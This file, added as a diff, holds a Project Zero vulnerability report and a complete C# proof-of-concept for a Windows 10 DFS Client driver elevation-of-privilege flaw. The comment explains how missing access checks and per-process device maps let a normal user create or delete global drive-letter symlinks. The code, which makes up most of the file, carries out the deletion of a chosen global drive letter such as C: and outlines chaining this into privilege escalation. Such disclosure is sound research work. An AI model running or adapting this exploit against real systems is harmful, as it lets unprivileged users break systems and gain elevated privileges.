@@ -1,0 +1,751 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=885
+
+Windows: DFS Client Driver Arbitrary Drive Mapping EoP
+Platform: Windows 10 10586, Edge 25.10586.0.0 not tested 8.1 Update 2 or Windows 7
+Class: Elevation of Privilege
+
+Summary:
+The DFS Client driver and running by default insecurely creates and deletes drive letter symbolic links in the current user context leading to EoP.
+
+Description:
+
+The DFS Client driver is used to map DFS shares. The device path is accessible by a normal user and the two IOCTL DfscFsctrlCreateDriveLetter and DfscFsctrlRemoveDriveLetter are marked as FILE_ANY_ACCESS so even through we only have read permission on the device they’re allowed.
+
+When mapping a DFS share the driver calls DfscCreateSymbolicLink to create a drive letter symbolic link. The drive letter is entirely under the user’s control and other than checking it’s a letter no other verification takes place. This function calls ZwCreateSymbolicLinkObject without specifying OBJ_FORCE_ACCESS_CHECK meaning it disables access checking. As it’s creating the name \??\X: rather than an explicit directory we can use per-process device maps to trick the driver into creating the symbolic link in any directory the user has read access to (the only limit on setting a per-process device map).
+
+In contrast when unmapping DfscDeleteSymbolicLink is called which calls ZwOpenSymbolicLinkObject without specifying OBJ_FORCE_ACCESS_CHECK. This means we can delete any drive letter symbolic link by first mounting a DFS share with a drive letter we want to delete, then either removing the letter from our current user dos devices directory, or switching our per-process drive map to point to \GLOBAL?? then unmapping.
+
+By combining the two we can do something like deleting the C: drive, then mounting a DFS share in its place and get some system level code to run something from the C: drive to get elevated privileges. We don’t even need to control the DFS share as once we’ve created the new C: drive symbolic link we have delete privileges on the object. We can use a behaviour of CSRSS’s DosDevice creation code which disables security if it can open the symbolic link for DELETE access while impersonating the user and the path to the link starts with \GLOBAL??. So we could redirect the C: drive link to any local location we like.
+
+Worth nothing this is almost the exact same bug I found in Truecrypt (https://bugs.chromium.org/p/project-zero/issues/detail?id=538). At least they tried to not mount over existing drive letters requiring more effort :-)
+
+I’ve not been able to work out if it’s possible to do this without requiring a DFS share (although for an internet connected system you might be able to point it at almost anywhere). I also don’t know if it needs to be domain joined, the driver is running though on a normal system. It seems to fail verifying the credentials, at least pointed to localhost SMB service. But perhaps it’ll work somehow. 
+
+Proof of Concept:
+
+I’ve provided a PoC as a C# source code file. You need to compile with .NET 4 or higher. Note you must compile as Any CPU or at least the correct bitness for the system under test other setting the dos devices directory has a habit of failing. You’ll need to have access to a DFS share somewhere, which might mean the test system needs to be domain joined. 
+
+The PoC will just delete an existing drive mapping you specify. For example you could specify C: drive, although that’ll make the system not work so well afterwards. 
+
+1) Compile the C# source code file.
+2) Execute the poc passing the path to an existing DFS share and the drive letter to delete e.g. poc \\server\share X:
+3) It should successfully delete the drive letter from \GLOBAL??. 
+
+Expected Result:
+Create drive letter anywhere the user can’t normally access should fail
+
+Observed Result:
+The user can create and delete arbitrary global drive letters.
+*/
+
+using Microsoft.Win32.SafeHandles;
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Security.AccessControl;
+using System.Text;
+
+namespace DfscTest
+{
+    class Program
+    {
+        [Flags]
+        public enum AttributeFlags : uint
+        {
+            None = 0,
+            Inherit = 0x00000002,
+            Permanent = 0x00000010,
+            Exclusive = 0x00000020,
+            CaseInsensitive = 0x00000040,
+            OpenIf = 0x00000080,
+            OpenLink = 0x00000100,
+            KernelHandle = 0x00000200,
+            ForceAccessCheck = 0x00000400,
+            IgnoreImpersonatedDevicemap = 0x00000800,
+            DontReparse = 0x00001000,
+        }
+
+        public class IoStatus
+        {
+            public IntPtr Pointer;
+            public IntPtr Information;
+
+            public IoStatus()
+            {
+            }
+
+            public IoStatus(IntPtr p, IntPtr i)
+            {
+                Pointer = p;
+                Information = i;
+            }
+        }
+
+        [Flags]
+        public enum ShareMode
+        {
+            None = 0,
+            Read = 0x00000001,
+            Write = 0x00000002,
+            Delete = 0x00000004,
+        }
+
+        [Flags]
+        public enum FileOpenOptions
+        {
+            None = 0,
+            DirectoryFile = 0x00000001,
+            WriteThrough = 0x00000002,
+            SequentialOnly = 0x00000004,
+            NoIntermediateBuffering = 0x00000008,
+            SynchronousIoAlert = 0x00000010,
+            SynchronousIoNonAlert = 0x00000020,
+            NonDirectoryFile = 0x00000040,
+            CreateTreeConnection = 0x00000080,
+            CompleteIfOplocked = 0x00000100,
+            NoEaKnowledge = 0x00000200,
+            OpenRemoteInstance = 0x00000400,
+            RandomAccess = 0x00000800,
+            DeleteOnClose = 0x00001000,
+            OpenByFileId = 0x00002000,
+            OpenForBackupIntent = 0x00004000,
+            NoCompression = 0x00008000,
+            OpenRequiringOplock = 0x00010000,
+            ReserveOpfilter = 0x00100000,
+            OpenReparsePoint = 0x00200000,
+            OpenNoRecall = 0x00400000,
+            OpenForFreeSpaceQuery = 0x00800000
+        }
+
+        [Flags]
+        public enum GenericAccessRights : uint
+        {
+            None = 0,
+            GenericRead = 0x80000000,
+            GenericWrite = 0x40000000,
+            GenericExecute = 0x20000000,
+            GenericAll = 0x10000000,
+            Delete = 0x00010000,
+            ReadControl = 0x00020000,
+            WriteDac = 0x00040000,
+            WriteOwner = 0x00080000,
+            Synchronize = 0x00100000,
+            MaximumAllowed = 0x02000000,
+        };
+
+
+        [Flags]
+        enum DirectoryAccessRights : uint
+        {
+            Query = 1,
+            Traverse = 2,
+            CreateObject = 4,
+            CreateSubDirectory = 8,
+            GenericRead = 0x80000000,
+            GenericWrite = 0x40000000,
+            GenericExecute = 0x20000000,
+            GenericAll = 0x10000000,
+            Delete = 0x00010000,
+            ReadControl = 0x00020000,
+            WriteDac = 0x00040000,
+            WriteOwner = 0x00080000,
+            Synchronize = 0x00100000,
+            MaximumAllowed = 0x02000000,
+        }
+
+        [Flags]
+        public enum ProcessAccessRights : uint
+        {
+            None = 0,
+            CreateProcess = 0x0080,
+            CreateThread = 0x0002,
+            DupHandle = 0x0040,
+            QueryInformation = 0x0400,
+            QueryLimitedInformation = 0x1000,
+            SetInformation = 0x0200,
+            SetQuota = 0x0100,
+            SuspendResume = 0x0800,
+            Terminate = 0x0001,
+            VmOperation = 0x0008,
+            VmRead = 0x0010,
+            VmWrite = 0x0020,
+            MaximumAllowed = GenericAccessRights.MaximumAllowed
+        };
+
+        [Flags]
+        public enum FileAccessRights : uint
+        {
+            None = 0,
+            ReadData = 0x0001,
+            WriteData = 0x0002,
+            AppendData = 0x0004,
+            ReadEa = 0x0008,
+            WriteEa = 0x0010,
+            Execute = 0x0020,
+            DeleteChild = 0x0040,
+            ReadAttributes = 0x0080,
+            WriteAttributes = 0x0100,
+            GenericRead = 0x80000000,
+            GenericWrite = 0x40000000,
+            GenericExecute = 0x20000000,
+            GenericAll = 0x10000000,
+            Delete = 0x00010000,
+            ReadControl = 0x00020000,
+            WriteDac = 0x00040000,
+            WriteOwner = 0x00080000,
+            Synchronize = 0x00100000,
+            MaximumAllowed = 0x02000000,
+        }
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        public sealed class UnicodeString
+        {
+            ushort Length;
+            ushort MaximumLength;
+            [MarshalAs(UnmanagedType.LPWStr)]
+            string Buffer;
+
+            public UnicodeString(string str)
+            {
+                Length = (ushort)(str.Length * 2);
+                MaximumLength = (ushort)((str.Length * 2) + 1);
+                Buffer = str;
+            }
+        }
+
+        [DllImport("ntdll.dll")]
+        static extern int NtClose(IntPtr handle);
+
+        public sealed class SafeKernelObjectHandle
+          : SafeHandleZeroOrMinusOneIsInvalid
+        {
+            public SafeKernelObjectHandle()
+              : base(true)
+            {
+            }
+
+            public SafeKernelObjectHandle(IntPtr handle, bool owns_handle)
+              : base(owns_handle)
+            {
+                SetHandle(handle);
+            }
+
+            protected override bool ReleaseHandle()
+            {
+                if (!IsInvalid)
+                {
+                    NtClose(this.handle);
+                    this.handle = IntPtr.Zero;
+                    return true;
+                }
+                return false;
+            }
+        }
+
+        public enum SecurityImpersonationLevel
+        {
+            Anonymous = 0,
+            Identification = 1,
+            Impersonation = 2,
+            Delegation = 3
+        }
+
+        public enum SecurityContextTrackingMode : byte
+        {
+            Static = 0,
+            Dynamic = 1
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public sealed class SecurityQualityOfService
+        {
+            int Length;
+            public SecurityImpersonationLevel ImpersonationLevel;
+            public SecurityContextTrackingMode ContextTrackingMode;
+            [MarshalAs(UnmanagedType.U1)]
+            public bool EffectiveOnly;
+
+            public SecurityQualityOfService()
+            {
+                Length = Marshal.SizeOf(this);
+            }
+        }
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        public sealed class ObjectAttributes : IDisposable
+        {
+            int Length;
+            IntPtr RootDirectory;
+            IntPtr ObjectName;
+            AttributeFlags Attributes;
+            IntPtr SecurityDescriptor;
+            IntPtr SecurityQualityOfService;
+
+            private static IntPtr AllocStruct(object s)
+            {
+                int size = Marshal.SizeOf(s);
+                IntPtr ret = Marshal.AllocHGlobal(size);
+                Marshal.StructureToPtr(s, ret, false);
+                return ret;
+            }
+
+            private static void FreeStruct(ref IntPtr p, Type struct_type)
+            {
+                Marshal.DestroyStructure(p, struct_type);
+                Marshal.FreeHGlobal(p);
+                p = IntPtr.Zero;
+            }
+
+            public ObjectAttributes() : this(AttributeFlags.None)
+            {
+            }
+
+            public ObjectAttributes(string object_name, AttributeFlags attributes) : this(object_name, attributes, null, null, null)
+            {
+            }
+
+            public ObjectAttributes(AttributeFlags attributes) : this(null, attributes, null, null, null)
+            {
+            }
+
+            public ObjectAttributes(string object_name) : this(object_name, AttributeFlags.CaseInsensitive, null, null, null)
+            {
+            }
+
+            public ObjectAttributes(string object_name, AttributeFlags attributes, SafeKernelObjectHandle root, SecurityQualityOfService sqos, GenericSecurityDescriptor security_descriptor)
+            {
+                Length = Marshal.SizeOf(this);
+                if (object_name != null)
+                {
+                    ObjectName = AllocStruct(new UnicodeString(object_name));
+                }
+                Attributes = attributes;
+                if (sqos != null)
+                {
+                    SecurityQualityOfService = AllocStruct(sqos);
+                }
+                if (root != null)
+                    RootDirectory = root.DangerousGetHandle();
+                if (security_descriptor != null)
+                {
+                    byte[] sd_binary = new byte[security_descriptor.BinaryLength];
+                    security_descriptor.GetBinaryForm(sd_binary, 0);
+                    SecurityDescriptor = Marshal.AllocHGlobal(sd_binary.Length);
+                    Marshal.Copy(sd_binary, 0, SecurityDescriptor, sd_binary.Length);
+                }
+            }
+
+            public void Dispose()
+            {
+                if (ObjectName != IntPtr.Zero)
+                {
+                    FreeStruct(ref ObjectName, typeof(UnicodeString));
+                }
+                if (SecurityQualityOfService != IntPtr.Zero)
+                {
+                    FreeStruct(ref SecurityQualityOfService, typeof(SecurityQualityOfService));
+                }
+                if (SecurityDescriptor != IntPtr.Zero)
+                {
+                    Marshal.FreeHGlobal(SecurityDescriptor);
+                    SecurityDescriptor = IntPtr.Zero;
+                }
+                GC.SuppressFinalize(this);
+            }
+
+            ~ObjectAttributes()
+            {
+                Dispose();
+            }
+        }
+
+        [DllImport("ntdll.dll")]
+        public static extern int NtOpenFile(
+            out IntPtr FileHandle,
+            FileAccessRights DesiredAccess,
+            ObjectAttributes ObjAttr,
+            [In] [Out] IoStatus IoStatusBlock,
+            ShareMode ShareAccess,
+            FileOpenOptions OpenOptions);
+
+        public static void StatusToNtException(int status)
+        {
+            if (status < 0)
+            {
+                throw new NtException(status);
+            }
+        }
+
+        public class NtException : ExternalException
+        {
+            [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+            private static extern IntPtr GetModuleHandle(string modulename);
+
+            [Flags]
+            enum FormatFlags
+            {
+                AllocateBuffer = 0x00000100,
+                FromHModule = 0x00000800,
+                FromSystem = 0x00001000,
+                IgnoreInserts = 0x00000200
+            }
+
+            [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+            private static extern int FormatMessage(
+              FormatFlags dwFlags,
+              IntPtr lpSource,
+              int dwMessageId,
+              int dwLanguageId,
+              out IntPtr lpBuffer,
+              int nSize,
+              IntPtr Arguments
+            );
+
+            [DllImport("kernel32.dll")]
+            private static extern IntPtr LocalFree(IntPtr p);
+
+            private static string StatusToString(int status)
+            {
+                IntPtr buffer = IntPtr.Zero;
+                try
+                {
+                    if (FormatMessage(FormatFlags.AllocateBuffer | FormatFlags.FromHModule | FormatFlags.FromSystem | FormatFlags.IgnoreInserts,
+                        GetModuleHandle("ntdll.dll"), status, 0, out buffer, 0, IntPtr.Zero) > 0)
+                    {
+                        return Marshal.PtrToStringUni(buffer);
+                    }
+                }
+                finally
+                {
+                    if (buffer != IntPtr.Zero)
+                    {
+                        LocalFree(buffer);
+                    }
+                }
+                return String.Format("Unknown Error: 0x{0:X08}", status);
+            }
+
+            public NtException(int status) : base(StatusToString(status))
+            {
+            }
+        }
+
+        public class SafeHGlobalBuffer : SafeHandleZeroOrMinusOneIsInvalid
+        {
+            public SafeHGlobalBuffer(int length)
+              : this(Marshal.AllocHGlobal(length), length, true)
+            {
+            }
+
+            public SafeHGlobalBuffer(IntPtr buffer, int length, bool owns_handle)
+              : base(owns_handle)
+            {
+                Length = length;
+                SetHandle(buffer);
+            }
+
+            public int Length
+            {
+                get; private set;
+            }
+
+            protected override bool ReleaseHandle()
+            {
+                if (!IsInvalid)
+                {
+                    Marshal.FreeHGlobal(handle);
+                    handle = IntPtr.Zero;
+                }
+                return true;
+            }
+        }
+
+        public class SafeStructureBuffer : SafeHGlobalBuffer
+        {
+            Type _type;
+
+            public SafeStructureBuffer(object value) : base(Marshal.SizeOf(value))
+            {
+                _type = value.GetType();
+                Marshal.StructureToPtr(value, handle, false);
+            }
+
+            protected override bool ReleaseHandle()
+            {
+                if (!IsInvalid)
+                {
+                    Marshal.DestroyStructure(handle, _type);
+                }
+                return base.ReleaseHandle();
+            }
+        }
+
+        public class SafeStructureOutBuffer<T> : SafeHGlobalBuffer
+        {
+            public SafeStructureOutBuffer() : base(Marshal.SizeOf(typeof(T)))
+            {
+            }
+
+            public T Result
+            {
+                get
+                {
+                    if (IsInvalid)
+                        throw new ObjectDisposedException("handle");
+
+                    return Marshal.PtrToStructure<T>(handle);
+                }
+            }
+        }
+
+        public static SafeFileHandle OpenFile(string name, FileAccessRights DesiredAccess, ShareMode ShareAccess, FileOpenOptions OpenOptions, bool inherit)
+        {
+            AttributeFlags flags = AttributeFlags.CaseInsensitive;
+            if (inherit)
+                flags |= AttributeFlags.Inherit;
+            using (ObjectAttributes obja = new ObjectAttributes(name, flags))
+            {
+                IntPtr handle;
+                IoStatus iostatus = new IoStatus();
+                int status = NtOpenFile(out handle, DesiredAccess, obja, iostatus, ShareAccess, OpenOptions);
+                StatusToNtException(status);
+                return new SafeFileHandle(handle, true);
+            }
+        }
+
+        [DllImport("ntdll.dll")]
+        public static extern int NtDeviceIoControlFile(
+          SafeFileHandle FileHandle,
+          IntPtr Event,
+          IntPtr ApcRoutine,
+          IntPtr ApcContext,
+          [Out] IoStatus IoStatusBlock,
+          uint IoControlCode,
+          byte[] InputBuffer,
+          int InputBufferLength,
+          byte[] OutputBuffer,
+          int OutputBufferLength
+        );
+
+        [DllImport("ntdll.dll")]
+        public static extern int NtFsControlFile(
+          SafeFileHandle FileHandle,
+          IntPtr Event,
+          IntPtr ApcRoutine,
+          IntPtr ApcContext,
+          [Out] IoStatus IoStatusBlock,
+          uint FSControlCode,
+          [In] byte[] InputBuffer,
+          int InputBufferLength,
+          [Out] byte[] OutputBuffer,
+          int OutputBufferLength
+        );
+
+        [DllImport("ntdll.dll")]
+        static extern int NtCreateDirectoryObject(out IntPtr Handle, DirectoryAccessRights DesiredAccess, ObjectAttributes ObjectAttributes);
+
+        [DllImport("ntdll.dll")]
+        static extern int NtOpenDirectoryObject(out IntPtr Handle, DirectoryAccessRights DesiredAccess, ObjectAttributes ObjectAttributes);
+
+        const int ProcessDeviceMap = 23;
+        
+        [DllImport("ntdll.dll")]
+        static extern int NtSetInformationProcess(
+	        IntPtr ProcessHandle,
+	        int ProcessInformationClass,
+            byte[] ProcessInformation,
+            int ProcessInformationLength);
+        
+        const uint CREATE_DRIVE_LETTER = 0x601E0;
+        const uint DELETE_DRIVE_LETTER = 0x601E4;
+
+        [StructLayout(LayoutKind.Sequential)]
+        struct DFsCreateDriveParameters
+        {
+            public ushort unk0;    // 0
+            public ushort flags;    // 1
+            public uint   some_cred_value;    // 2            
+            public ushort drive_path_length;    // 4  - Length of drive letter path
+            public ushort dfs_path_length;    // 5 - Can't be zero, think this is length of DFS path
+            public ushort creds_length;    // 6
+            public ushort password_length;    // 7 - If set this + 2 must be < length 3
+            public ushort length_5;    // 8
+            public ushort length_6;    // 9
+            // From here is the data            
+        }
+
+        static byte[] StructToBytes(object o)
+        {
+            int size = Marshal.SizeOf(o);
+            IntPtr p = Marshal.AllocHGlobal(size);
+            try
+            {
+                Marshal.StructureToPtr(o, p, false);
+                byte[] ret = new byte[size];
+                Marshal.Copy(p, ret, 0, size);
+                return ret;
+            }
+            finally
+            {
+                if (p != IntPtr.Zero)
+                    Marshal.FreeHGlobal(p);
+            }
+        }
+
+        static byte[] GetBytes(string s)
+        {
+            return Encoding.Unicode.GetBytes(s + "\0");
+        }
+
+        static void MountDfsShare(string dfs_path, string drive_path)
+        {
+            using (SafeFileHandle handle = OpenFile(@"\Device\DfsClient", FileAccessRights.MaximumAllowed, ShareMode.None, FileOpenOptions.None, false))
+            {
+                IoStatus status = new IoStatus();
+
+                byte[] dfs_path_bytes = GetBytes(dfs_path);
+                byte[] drive_path_bytes = GetBytes(drive_path);
+                DFsCreateDriveParameters create_drive = new DFsCreateDriveParameters();
+
+                create_drive.drive_path_length = (ushort)drive_path_bytes.Length;
+                create_drive.dfs_path_length = (ushort)dfs_path_bytes.Length;
+
+                List<byte> buffer = new List<byte>();
+                buffer.AddRange(StructToBytes(create_drive));
+                buffer.AddRange(drive_path_bytes);
+                buffer.AddRange(dfs_path_bytes);
+
+                StatusToNtException(NtFsControlFile(handle, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, status, CREATE_DRIVE_LETTER, buffer.ToArray(), buffer.Count, new byte[0], 0));
+            }
+        }
+
+        static void UnmountDfsShare(string drive_path)
+        {
+            using (SafeFileHandle handle = OpenFile(@"\Device\DfsClient", FileAccessRights.MaximumAllowed, ShareMode.None, FileOpenOptions.None, false))
+            {
+                List<byte> buffer = new List<byte>();
+                buffer.AddRange(new byte[4]);
+                buffer.AddRange(GetBytes(drive_path));                
+                byte[] output_data = new byte[8];
+                IoStatus status = new IoStatus();
+                StatusToNtException(NtFsControlFile(handle, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero,
+                    status, DELETE_DRIVE_LETTER, buffer.ToArray(), buffer.Count, output_data, output_data.Length));
+            }
+        }
+
+        static SafeKernelObjectHandle CreateDirectory(string path)
+        {
+            using (ObjectAttributes obja = new ObjectAttributes(path, AttributeFlags.CaseInsensitive))
+            {
+                IntPtr handle;
+                StatusToNtException(NtCreateDirectoryObject(out handle, DirectoryAccessRights.GenericAll, obja));
+                return new SafeKernelObjectHandle(handle, true);
+            }
+        }
+
+        static SafeKernelObjectHandle OpenDirectory(string path)
+        {
+            using (ObjectAttributes obja = new ObjectAttributes(path, AttributeFlags.CaseInsensitive))
+            {
+                IntPtr handle;
+                StatusToNtException(NtOpenDirectoryObject(out handle, DirectoryAccessRights.MaximumAllowed, obja));
+                return new SafeKernelObjectHandle(handle, true);
+            }
+        }
+
+        [DllImport("ntdll.dll")]
+        static extern int NtOpenSymbolicLinkObject(
+            out IntPtr LinkHandle,
+            GenericAccessRights DesiredAccess,
+            ObjectAttributes ObjectAttributes
+        );
+
+        [DllImport("ntdll.dll")]
+        static extern int NtMakeTemporaryObject(SafeKernelObjectHandle ObjectHandle);
+
+        static SafeKernelObjectHandle OpenSymbolicLink(SafeKernelObjectHandle directory, string path, GenericAccessRights access_rights)
+        {
+            using (ObjectAttributes obja = new ObjectAttributes(path, AttributeFlags.CaseInsensitive, directory, null, null))
+            {
+                IntPtr handle;
+                if (NtOpenSymbolicLinkObject(out handle, access_rights, obja) != 0)
+                {
+                    return null;
+                }
+
+                return new SafeKernelObjectHandle(handle, true);
+            }
+        }
+
+        static void SetDosDirectory(SafeKernelObjectHandle directory)
+        {
+            IntPtr p = directory.DangerousGetHandle();
+            byte[] data = null;
+            if (IntPtr.Size == 4)
+            {
+                data = BitConverter.GetBytes(p.ToInt32());
+            }
+            else
+            {
+                data = BitConverter.GetBytes(p.ToInt64());
+            }
+
+            StatusToNtException(NtSetInformationProcess(new IntPtr(-1), ProcessDeviceMap, data, data.Length));
+        }
+
+        static void Main(string[] args)
+        {
+            try
+            {
+                if (args.Length < 2)
+                {
+                    Console.WriteLine(@"DeleteGlobalDrivePoC \\dfs\share X:");
+                    return;
+                }
+
+                string dfs_path = args[0];
+                string drive_path = args[1];
+
+                if (!Path.IsPathRooted(dfs_path) || !dfs_path.StartsWith(@"\\"))
+                    throw new ArgumentException("DFS path must be a UNC path");
+                if (drive_path.Length != 2 || !Char.IsLetter(drive_path[0]) || drive_path[1] != ':')
+                    throw new ArgumentException("Drive letter must of form X:");
+
+                SafeKernelObjectHandle dir = CreateDirectory(null);
+
+                SafeKernelObjectHandle global = OpenDirectory(@"\GLOBAL??");
+                using (SafeKernelObjectHandle symlink = OpenSymbolicLink(global, drive_path, GenericAccessRights.GenericRead))
+                {
+                    if (symlink == null)
+                    {
+                        Console.WriteLine("[ERROR]: Drive letter does existing in global device directory");
+                        return;
+                    }                    
+                }
+
+                SetDosDirectory(dir);
+                MountDfsShare(dfs_path, drive_path);
+                SetDosDirectory(global);
+                UnmountDfsShare(drive_path);
+
+                using (SafeKernelObjectHandle symlink = OpenSymbolicLink(global, drive_path, GenericAccessRights.GenericRead))
+                {
+                    if (symlink == null)
+                    {
+                        Console.WriteLine("[SUCCESS]: Deleted the {0} symlink", drive_path);
+                    }
+                    else
+                    {
+                        Console.WriteLine("[ERROR]: Symlink still in global directory");
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[ERROR]: {0}", ex.Message);
+            }
+        }
+    }
+}
